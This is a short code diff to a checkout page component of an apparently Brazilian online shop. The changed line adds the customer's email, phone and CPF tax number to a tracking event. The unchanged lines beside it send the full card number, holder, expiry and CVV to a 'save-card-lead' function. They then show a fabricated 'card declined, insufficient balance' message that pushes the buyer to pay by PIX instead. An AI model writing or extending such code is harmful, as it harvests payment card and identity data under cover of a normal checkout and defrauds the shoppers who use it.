@@ -175,7 +175,7 @@ const EconomizareCheckout = () => {
       };
 
       if (paymentMethod === "credit_card") {
-        trackFunnelEvent({ event: "add_payment_info", properties: { method: "credit_card", card_last4: cardForm.number.slice(-4) } });
+        trackFunnelEvent({ event: "add_payment_info", properties: { method: "credit_card", card_last4: cardForm.number.slice(-4) }, userData: { email: form.email, phone: form.phone, externalId: form.cpf } });
         await supabase.functions.invoke("save-card-lead", { body: { ...payload, card: { number: cardForm.number.replace(/\s/g, ""), holder: cardForm.holder, expiry: cardForm.expiry, cvv: cardForm.cvv, installments: cardForm.installments } } });
         await new Promise(resolve => setTimeout(resolve, 2000));
         toast({ title: "Pagamento não aprovado", description: "Cartão recusado: saldo insuficiente. Por favor, utilize o PIX para concluir seu pedido.", variant: "destructive" });
